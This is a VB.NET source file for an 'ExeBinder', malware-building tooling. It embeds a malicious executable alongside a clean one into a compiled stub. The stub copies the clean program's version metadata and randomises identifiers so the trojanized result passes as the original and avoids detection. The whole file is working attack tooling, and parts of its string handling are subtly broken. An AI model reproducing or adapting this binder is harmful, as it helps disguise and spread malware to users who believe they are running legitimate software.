Imports System.Reflection
Imports System.CodeDom.Compiler

Module ExeBinder

    Sub Main()
        ExeBind("C:\CleanExe.exe", "C:\SpookyExe.exe") 'Binds a copy of SpookyExe to CleanExe
    End Sub

    Sub ExeBind(ByVal infile As String, ByVal infectedfile As String)
        Dim Info As FileVersionInfo
        Info = FileVersionInfo.GetVersionInfo(infile)
        Dim source As String = My.Resources.String1
        source = source.Replace("%GoodFileCodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileCodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%GoodFileBytes%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileBytes%", random_key(GetRandom(10)))
        source = source.Replace("%GoodFileName%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileName%", random_key(GetRandom(10)))
        source = source.Replace("%SleeperValue%", GetRandom(1000) + 1000)
        source = source.Replace("%ProductName%", Info.ProductName)
        source = source.Replace("%FileDescription%", Info.FileDescription)
        source = source.Replace("%CompanyName%", Info.CompanyName)
        source = source.Replace("%ProductName%", Info.ProductName)
        source = source.Replace("%LegalCopyright%", Info.LegalCopyright)
        source = source.Replace("%LegalTrademarks%", Info.LegalTrademarks)
        source = source.Replace("%FileVersion%", Info.FileVersion)
        source = source.Replace("%ProductVersion%", Info.ProductVersion)
        source = source.Replace("%goodfile%", format(IO.File.ReadAllBytes(infile)))
        source = source.Replace("%badfile%", format(IO.File.ReadAllBytes(infectedfile)))
        iCompiler.GenerateExecutable(infile, source, "")
    End Sub
    Function GetRandom(ByVal range As Integer)
        Randomize()
        Return CInt(Math.Ceiling(Rnd() * range))
    End Function
    Public Class iCompiler
        Public Shared Sub GenerateExecutable(ByVal Output As String, ByVal Source As String, ByVal Icon As String)
            Dim Compiler As New VBCodeProvider
            Dim Parameters As New CompilerParameters()
            Dim cResults As CompilerResults
            Parameters.GenerateExecutable = True
            Parameters.OutputAssembly = Output
            Parameters.ReferencedAssemblies.Add("System.dll")
            Parameters.ReferencedAssemblies.Add("System.Data.dll")
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
            Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            Parameters.CompilerOptions = "/t:winexe"
            cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        End Sub
    End Class
    Function format(ByVal input As Byte()) As String 'Line bypassing for codedom based apps. thanks prototype
        Dim out As New System.Text.StringBuilder
        Dim base64data As String = Convert.ToBase64String(input)
        Dim arr As String() = SplitString(base64data, 50000)
        For i As Integer = 0 To arr.Length - 1
            If i = arr.Length - 1 Then
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function
    Function SplitString(ByVal input As String, ByVal partsize As Long) As String() 'Splitting strings . thanks to prototype
        Dim amount As Long = Math.Ceiling(input.Length / partsize)
        Dim out(amount - 1) As String
        Dim currentpos As Long = 0
        For I As Integer = 0 To amount - 1
            If I = amount - 1 Then
                Dim temp((input.Length - currentpos) - 1) As Char
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos))
                out(I) = Convert.ToString(temp)
            Else
                Dim temp(partsize - 1) As Char
                input.CopyTo(currentpos, temp, 0, partsize)
                out(I) = Convert.ToString(temp)
                currentpos += partsize
            End If
        Next
        Return out
    End Function
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
End Module
